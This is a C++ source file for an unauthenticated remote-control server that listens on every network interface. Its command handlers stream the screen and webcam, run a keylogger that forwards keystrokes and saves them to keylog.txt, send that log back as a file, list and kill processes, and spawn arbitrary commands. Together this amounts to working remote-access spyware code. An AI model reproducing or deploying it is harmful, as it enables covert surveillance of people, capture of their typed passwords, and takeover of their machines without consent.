#include "net/backend_server.h"

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <unistd.h> // for gethostname
#include <netinet/tcp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <fstream>
#include <sys/ioctl.h>     // For TIOCOUTQ
#include <linux/sockios.h> // For waiting buffer

#include <chrono>
#include <iostream>
#include <sstream>
#include <atomic>
#include <thread>
#include <memory>
#include <vector>
#include <algorithm> // for transform
#include <mutex>
#include <functional>
#include <unordered_map>

#include "api/monitor.hpp"
#include "api/process.hpp"
#include "api/webcam.hpp"
#include "api/keylogger.hpp"
#include "api/application.hpp"

// ==========================================
// Global Hardware State (Single Instance Resource)
// ==========================================
namespace {
    // Application Manager (Shared)
    static ApplicationManager g_app_manager;

    // --- STREAMING INFRASTRUCTURE ---
    using PacketCallback = std::function<bool(const std::vector<uint8_t>&)>;
    struct Subscriber {
        uint32_t id;
        PacketCallback send_fn;
    };

    // Monitor State
    std::atomic<bool> g_screen_streaming{false};       // Thread Control
    std::mutex g_screen_mutex;                         // Protects subs & header
    std::vector<Subscriber> g_screen_subs;             // Active subscribers
    std::vector<uint8_t> g_screen_header_cache;        // SPS/PPS Cache

    // Webcam State
    std::atomic<bool> g_webcam_streaming{false};      // Thread Control
    std::mutex g_webcam_mutex;                        // Protects subs & header
    std::vector<Subscriber> g_webcam_subs;            // Active subscribers
    std::vector<uint8_t> g_webcam_header_cache;       // SPS/PPS Cache
    int g_webcam_index = 0;

    // Keylogger State
    std::atomic<bool> g_keylog_active{false};
    std::unique_ptr<Keylogger> g_keylogger;
    std::mutex g_keylog_mutex;

    // Helpers
    int to_int(const std::string& str, int def_val = 0) {
        try { return std::stoi(str); } catch (...) { return def_val; }
    }

    std::vector<std::string> split_ws(const std::string& s) {
        std::istringstream iss(s);
        std::vector<std::string> out;
        for (std::string tok; iss >> tok;) out.push_back(tok);
        return out;
    }

    void make_dummy_jpeg(std::vector<uint8_t>& out, int size) {
        out.resize(size);
        for (int i = 0; i < size; ++i) out[i] = static_cast<uint8_t>(i % 256);
    }

    // Congestion Control Helper
    [[maybe_unused]] static size_t get_socket_pending(int fd) {
        int pending = 0;
        if (ioctl(fd, TIOCOUTQ, &pending) < 0) return 0;
        return (size_t)pending;
    }
}

static const size_t BUFF_SIZE = 8 * 1024 * 1024;
static const int BACKEND_HEADER_SIZE = 12;
// 1MB Threshold for dropping frames.
// If OS buffer has >1MB pending, we skip sending video to let it drain.
static const size_t CONGESTION_THRESHOLD = 1 * 1024 * 1024;

static int set_socket_opts(int fd) {
    int flag = 1;
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag));
    int snd = 8 * 1024 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
    int rcv = 8 * 1024 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &rcv, sizeof(rcv));
    return 0;
}

BackendServer::BackendServer(uint16_t port)
    : port_(port), listen_fd_(-1), running_(false) {}

BackendServer::~BackendServer() { stop(); }

void BackendServer::run() {
    listen_fd_ = socket(AF_INET, SOCK_STREAM, 0);
    if (listen_fd_ < 0) {
        perror("socket");
        return;
    }

    int opt = 1;
    setsockopt(listen_fd_, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port_);

    if (bind(listen_fd_, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind");
        close(listen_fd_);
        listen_fd_ = -1;
        return;
    }

    if (listen(listen_fd_, 10) < 0) {
        perror("listen");
        close(listen_fd_);
        listen_fd_ = -1;
        return;
    }

    running_.store(true);
    std::cout << "[BackendServer] Listening on port " << port_ << std::endl;

    acceptLoop();
}

void BackendServer::stop() {
    if (!running_.load()) return;
    running_.store(false);
    if (listen_fd_ >= 0) {
        close(listen_fd_);
        listen_fd_ = -1;
    }
}

void BackendServer::acceptLoop() {
    while (running_.load()) {
        struct sockaddr_in peer;
        socklen_t plen = sizeof(peer);
        int fd = accept(listen_fd_, (struct sockaddr*)&peer, &plen);
        if (fd < 0) {
            if (errno == EINTR) continue;
            if (!running_.load()) break;
            perror("accept");
            std::this_thread::sleep_for(std::chrono::seconds(1));
            continue;
        }

        set_socket_opts(fd);
        std::cout << "[BackendServer] New connection from " << inet_ntoa(peer.sin_addr) << ":" << ntohs(peer.sin_port) << " fd=" << fd << std::endl;

        std::thread t(&BackendServer::handleClient, this, fd);
        t.detach();
    }
}

bool BackendServer::readFrame(int fd, std::vector<uint8_t>& payload, uint32_t& client_id, uint32_t& backend_id) {
    uint8_t header[BACKEND_HEADER_SIZE];
    size_t got = 0;
    while (got < BACKEND_HEADER_SIZE) {
        ssize_t n = recv(fd, header + got, BACKEND_HEADER_SIZE - got, 0);
        if (n <= 0) return false;
        got += n;
    }

    uint32_t net_len, net_client, net_backend;
    memcpy(&net_len, header, 4);
    memcpy(&net_client, header + 4, 4);
    memcpy(&net_backend, header + 8, 4);

    uint32_t len = ntohl(net_len);
    client_id = ntohl(net_client);
    backend_id = ntohl(net_backend);

    if (len > BUFF_SIZE - BACKEND_HEADER_SIZE) {
        std::cerr << "[BackendServer] payload too large: " << len << std::endl;
        return false;
    }

    payload.resize(len);
    size_t rcv = 0;
    while (rcv < len) {
        ssize_t n = recv(fd, payload.data() + rcv, len - rcv, 0);
        if (n <= 0) return false;
        rcv += n;
    }

    return true;
}

bool BackendServer::sendFrame(int fd, const uint8_t* payload, uint32_t payload_len, uint32_t client_id, uint32_t backend_id) {
    uint32_t net_len = htonl(payload_len);
    uint32_t net_client = htonl(client_id);
    uint32_t net_backend = htonl(backend_id);

    uint8_t header[BACKEND_HEADER_SIZE];
    memcpy(header, &net_len, 4);
    memcpy(header + 4, &net_client, 4);
    memcpy(header + 8, &net_backend, 4);

    // Send header
    size_t sent = 0;
    while (sent < BACKEND_HEADER_SIZE) {
        ssize_t n = send(fd, header + sent, BACKEND_HEADER_SIZE - sent, 0);
        if (n <= 0) return false;
        sent += n;
    }

    // Send payload
    sent = 0;
    while (sent < payload_len) {
        ssize_t n = send(fd, payload + sent, payload_len - sent, 0);
        if (n <= 0) return false;
        sent += n;
    }
    return true;
}

void BackendServer::streamingThread(int, uint32_t, uint32_t, std::atomic_bool*) {
    // Legacy placeholder
}

void BackendServer::handleClient(int fd) {
    std::vector<uint8_t> payload;
    uint32_t client_id = 0, backend_id = 0;

    // Send Mutex
    std::mutex send_mu;
    auto send_text = [&](const std::string& s, uint32_t cid, uint32_t bid) -> bool {
        std::lock_guard<std::mutex> lk(send_mu);
        return sendFrame(fd, (const uint8_t*)s.data(), (uint32_t)s.size(), cid, bid);
    };
    auto send_bytes = [&](const std::vector<uint8_t>& b, uint32_t cid, uint32_t bid) -> bool {
        std::lock_guard<std::mutex> lk(send_mu);
        return sendFrame(fd, b.data(), (uint32_t)b.size(), cid, bid);
    };

    auto send_file = [&](const std::string& path, const std::string& filename, uint32_t cid, uint32_t bid) {
        std::ifstream f(path, std::ios::binary | std::ios::ate);
        if (!f) return;
        std::streamsize size = f.tellg();
        f.seekg(0, std::ios::beg);
        std::vector<uint8_t> buffer(size);
        if (f.read((char*)buffer.data(), size)) {
             uint32_t name_len = filename.length();
             uint32_t net_name_len = htonl(name_len);
             std::vector<uint8_t> packet;
             packet.push_back(0x03);
             packet.resize(1 + 4 + name_len + size);
             memcpy(packet.data() + 1, &net_name_len, 4);
             memcpy(packet.data() + 5, filename.data(), name_len);
             memcpy(packet.data() + 5 + name_len, buffer.data(), size);
             send_bytes(packet, cid, bid);
             send_text("OK: Sent file " + filename, cid, bid);
        }
    };

    // Handlers Map
    std::unordered_map<std::string, std::function<void(const std::vector<std::string>&, uint32_t, uint32_t)>> handlers;

    // --- Monitor Handlers ---
    handlers["start_monitor_stream"] = [&](const std::vector<std::string>&, uint32_t cid, uint32_t bid) {
        std::lock_guard<std::mutex> lk(g_screen_mutex);

        // 1. Register Subscriber
        PacketCallback cb = [send_bytes, cid, bid](const std::vector<uint8_t>& data) {
            return send_bytes(data, cid, bid);
        };
        g_screen_subs.push_back({cid, cb});
        send_text("STATUS:MONITOR_STREAM:STARTED", cid, bid);

        // 2. Smart Join: Send Cached Header if available
        if (!g_screen_header_cache.empty()) {
            std::vector<uint8_t> header_pkt;
            header_pkt.push_back(0x01); // MONITOR_STREAM
            header_pkt.insert(header_pkt.end(), g_screen_header_cache.begin(), g_screen_header_cache.end());
            send_bytes(header_pkt, cid, bid);
            // std::cout << "[Backend] Sent cached header to CID " << cid << std::endl;
        }

        // 3. Start Global Streaming Thread if not running
        if (!g_screen_streaming) {
             g_screen_streaming = true;
             std::thread([&]() {
                Monitor monitor;
                // int drop_count = 0; // Unused for now

                monitor.stream_h264([&](const std::vector<uint8_t>& chunk) -> bool {
                    std::lock_guard<std::mutex> lk_subs(g_screen_mutex);
                    if (!g_screen_streaming) return false;

                    // HEADER CACHING Strategy:
                    // First few chunks usually contain SPS/PPS/IDR.
                    // We simply cache the first 4KB or wait for IDR?
                    // Simple logic: If cache empty, appending first chunks.
                    if (g_screen_header_cache.size() < 4096) {
                        g_screen_header_cache.insert(g_screen_header_cache.end(), chunk.begin(), chunk.end());
                    }

                    // Prepare Packet
                    std::vector<uint8_t> packet;
                    packet.push_back(0x01);
                    packet.insert(packet.end(), chunk.begin(), chunk.end());

                    // Broadcast to all subscribers
                    for (auto it = g_screen_subs.begin(); it != g_screen_subs.end(); ) {
                        if (!it->send_fn(packet)) {
                            // Socket Error -> Remove Subscriber
                            // std::cout << "[Backend] Subscriber CID " << it->id << " disconnected." << std::endl;
                            it = g_screen_subs.erase(it);
                        } else {
                            ++it;
                        }
                    }

                    // Auto-Stop if no subscribers left?
                    if (g_screen_subs.empty()) {
                         // std::cout << "[Backend] No subscribers. Stopping Monitor Stream." << std::endl;
                         g_screen_streaming = false;
                         g_screen_header_cache.clear();
                         return false; // Stop Encoder
                    }

                    return true;
                });

                // Thread Exit Cleanup
                {
                    std::lock_guard<std::mutex> lk_subs(g_screen_mutex);
                    g_screen_streaming = false;
                    g_screen_header_cache.clear();
                    // Notify any remaining subs? No need.
                }
             }).detach();
        }
    };

    handlers["stop_monitor_stream"] = [&](const std::vector<std::string>&, uint32_t cid, uint32_t bid) {
        (void)cid; (void)bid;
        std::lock_guard<std::mutex> lk(g_screen_mutex);

        // Broadcast STOP to all
        std::string msg = "STATUS:MONITOR_STREAM:STOPPED";
        std::vector<uint8_t> pkt(msg.begin(), msg.end());
        for(auto& sub : g_screen_subs) {
            sub.send_fn(pkt);
        }

        // GLOBAL STOP
        g_screen_streaming = false;
        g_screen_subs.clear();
        g_screen_header_cache.clear();
    };

    handlers["frame_capture"] = [&](const std::vector<std::string>&, uint32_t cid, uint32_t bid) {
        Monitor m;
        auto jpeg = m.capture_frame();
        if (jpeg.empty()) make_dummy_jpeg(jpeg, 2048);
        send_bytes(jpeg, cid, bid);
    };


    // --- Webcam Handlers ---
    handlers["start_webcam_stream"] = [&](const std::vector<std::string>& a, uint32_t cid, uint32_t bid) {
        std::lock_guard<std::mutex> lk(g_webcam_mutex);

        // 1. Register Subscriber
        PacketCallback cb = [send_bytes, cid, bid](const std::vector<uint8_t>& data) {
            return send_bytes(data, cid, bid);
        };
        g_webcam_subs.push_back({cid, cb});

        int idx = (a.size() >= 2) ? to_int(a[1], 0) : 0;
        g_webcam_index = idx;

        send_text("STATUS:WEBCAM_STREAM:STARTED", cid, bid);

        // 2. Smart Join: Send Cached Header
        if (!g_webcam_header_cache.empty()) {
            std::vector<uint8_t> header_pkt;
            header_pkt.push_back(0x02); // WEBCAM_STREAM
            header_pkt.insert(header_pkt.end(), g_webcam_header_cache.begin(), g_webcam_header_cache.end());
            send_bytes(header_pkt, cid, bid);
        }

        // 3. Start Global Streaming Thread
        if (!g_webcam_streaming) {
             g_webcam_streaming = true;
             std::thread([&]() {
                Webcam cam(g_webcam_index);
                // int drop_count = 0;

                cam.stream_h264([&](const std::vector<uint8_t>& chunk) -> bool {
                    std::lock_guard<std::mutex> lk_subs(g_webcam_mutex);
                    if (!g_webcam_streaming) return false;

                    // HEADER CACHING
                    if (g_webcam_header_cache.size() < 4096) {
                        g_webcam_header_cache.insert(g_webcam_header_cache.end(), chunk.begin(), chunk.end());
                    }

                    // Prepare Packet
                    std::vector<uint8_t> packet;
                    packet.push_back(0x02); // WEBCAM_STREAM
                    packet.insert(packet.end(), chunk.begin(), chunk.end());

                    // Broadcast
                    for (auto it = g_webcam_subs.begin(); it != g_webcam_subs.end(); ) {
                        if (!it->send_fn(packet)) {
                            it = g_webcam_subs.erase(it);
                        } else {
                            ++it;
                        }
                    }

                    if (g_webcam_subs.empty()) {
                         g_webcam_streaming = false;
                         g_webcam_header_cache.clear();
                         return false;
                    }
                    return true;
                });

                // Cleanup
                {
                    std::lock_guard<std::mutex> lk_subs(g_webcam_mutex);
                    g_webcam_streaming = false;
                    g_webcam_header_cache.clear();
                }
             }).detach();
        }
    };

    handlers["stop_webcam_stream"] = [&](const std::vector<std::string>&, uint32_t cid, uint32_t bid) {
        (void)cid; (void)bid;
        std::lock_guard<std::mutex> lk(g_webcam_mutex);

        // Broadcast STOP to all
        std::string msg = "STATUS:WEBCAM_STREAM:STOPPED";
        std::vector<uint8_t> pkt(msg.begin(), msg.end());
        for(auto& sub : g_webcam_subs) {
            sub.send_fn(pkt);
        }

        // GLOBAL STOP
        g_webcam_streaming = false;
        g_webcam_subs.clear();
        g_webcam_header_cache.clear();
    };


    // --- Keylogger Handlers ---
    handlers["start_keylog"] = [&](const auto&, uint32_t cid, uint32_t bid) {
        std::lock_guard<std::mutex> lk(g_keylog_mutex);
        if (g_keylog_active.load()) return (void)send_text("ERROR:KEYLOG:ALREADY_ACTIVE", cid, bid);

        if (!g_keylogger) g_keylogger = std::make_unique<Keylogger>();

        // Start returns bool
        bool ok = g_keylogger->start([&, cid, bid](std::string keys) {
            send_text("KEYLOG: " + keys, cid, bid);
            // Simple file log
            static std::ofstream f("keylog.txt", std::ios::app);
            if(f.is_open()) f << keys << std::flush;
        });

        if (ok) {
            g_keylog_active.store(true);
            send_text("STATUS:KEYLOGGER:STARTED", cid, bid);
        } else {
            send_text("ERROR:KEYLOGGER:START_FAILED:" + g_keylogger->get_last_error(), cid, bid);
        }
    };

    handlers["stop_keylog"] = [&](const auto&, uint32_t cid, uint32_t bid) {
        std::lock_guard<std::mutex> lk(g_keylog_mutex);
        if (g_keylog_active.load() && g_keylogger) {
            g_keylogger->stop();
            g_keylog_active.store(false);
            send_text("STATUS:KEYLOGGER:STOPPED", cid, bid);
        } else {
            send_text("ERROR:KEYLOGGER:NOT_ACTIVE", cid, bid);
        }
    };

    handlers["get_keylog"] = [&](const auto&, uint32_t cid, uint32_t bid) {
        send_file("keylog.txt", "keylog_dump.txt", cid, bid);
    };


    // --- Process & App Handlers ---
    handlers["list_process"] = [&](const auto&, uint32_t cid, uint32_t bid) {
        std::ostringstream oss;
        Process::print_all(oss);
        send_text(oss.str(), cid, bid);
    };

    handlers["kill_process"] = [&](const auto& a, uint32_t cid, uint32_t bid) {
        if(a.size() < 2) return;
        Process p(to_int(a[1]));
        if(p.destroy() == 0) send_text("OK: Killed " + a[1], cid, bid);
        else send_text("ERROR: Kill failed", cid, bid);
    };

    handlers["start_process"] = [&](const auto& a, uint32_t cid, uint32_t bid) {
        if(a.size() < 2) return;
        std::string cmd;
        for(size_t i=1; i<a.size(); ++i) { if(i>1) cmd+=" "; cmd+=a[i]; }

        // Smart Launch Logic
        auto matches = g_app_manager.search_apps(cmd);
        if(!matches.empty()) {
            int pid = g_app_manager.start_app(matches[0].id);
            if(pid > 0) return (void)send_text("OK: Smart Launch " + matches[0].name, cid, bid);
        }

        int pid = Process::spawn(cmd);
        if(pid > 0) send_text("OK: Spawned PID " + std::to_string(pid), cid, bid);
        else send_text("ERROR: Spawn failed", cid, bid);
    };

    handlers["list_apps"] = [&](const auto&, uint32_t cid, uint32_t bid) {
        auto apps = g_app_manager.get_all_apps();
        std::string payload = "DATA:APPS:";
        for(size_t i=0; i<apps.size(); ++i) {
            if(i>0) payload += ";";
            payload += apps[i].id + "|" + apps[i].name + "|" + apps[i].icon + "|" + apps[i].exec + "|" + apps[i].keywords;
        }
        send_text(payload, cid, bid);
    };

    handlers["search_apps"] = [&](const auto& a, uint32_t cid, uint32_t bid) {
        std::string q;
        for(size_t i=1; i<a.size(); ++i) { if(i>1) q+=" "; q+=a[i]; }
        auto apps = g_app_manager.search_apps(q);
        std::string payload = "DATA:APPS:";
        for(size_t i=0; i<apps.size() && i<50; ++i) {
            if(i>0) payload += ";";
            payload += apps[i].id + "|" + apps[i].name + "|" + apps[i].icon + "|" + apps[i].exec + "|" + apps[i].keywords;
        }
        send_text(payload, cid, bid);
    };

    handlers["start_app"] = [&](const auto& a, uint32_t cid, uint32_t bid) {
        if(a.size()<2) return;
        int pid = g_app_manager.start_app(a[1]);
        if(pid>0) send_text("OK: App PID " + std::to_string(pid), cid, bid);
        else send_text("ERROR: Start App Failed", cid, bid);
    };

    // System Handlers
    handlers["ping"] = [&](const auto&, uint32_t cid, uint32_t bid) {
        char h[256]; gethostname(h, 256);
        send_text("INFO: NAME=" + std::string(h), cid, bid);
    };
    handlers["get_state"] = [&](const auto&, uint32_t cid, uint32_t bid) {
         if(g_screen_streaming) send_text("STATUS:SYNC:monitor=active", cid, bid);
         if(g_webcam_streaming) send_text("STATUS:SYNC:webcam=active", cid, bid);
         if(g_keylog_active) send_text("STATUS:SYNC:keylogger=active", cid, bid);
         send_text("STATUS:SYNC:complete", cid, bid);
    };


    // Main Loop
    while (running_.load()) {
        payload.clear();
        if (!readFrame(fd, payload, client_id, backend_id)) break;

        std::string msg;
        if (!payload.empty()) msg.assign((char*)payload.data(), payload.size());
        // trim nulls
        size_t z = msg.find('\0');
        if (z != std::string::npos) msg.resize(z);

        auto parts = split_ws(msg);
        if (parts.empty()) continue;

        auto it = handlers.find(parts[0]);
        if (it != handlers.end()) {
            it->second(parts, client_id, backend_id);
        } else {
            send_text("Unknown command: " + parts[0], client_id, backend_id);
        }
    }

    close(fd);
    std::cout << "[BackendServer] Client disconnect fd=" << fd << std::endl;
}
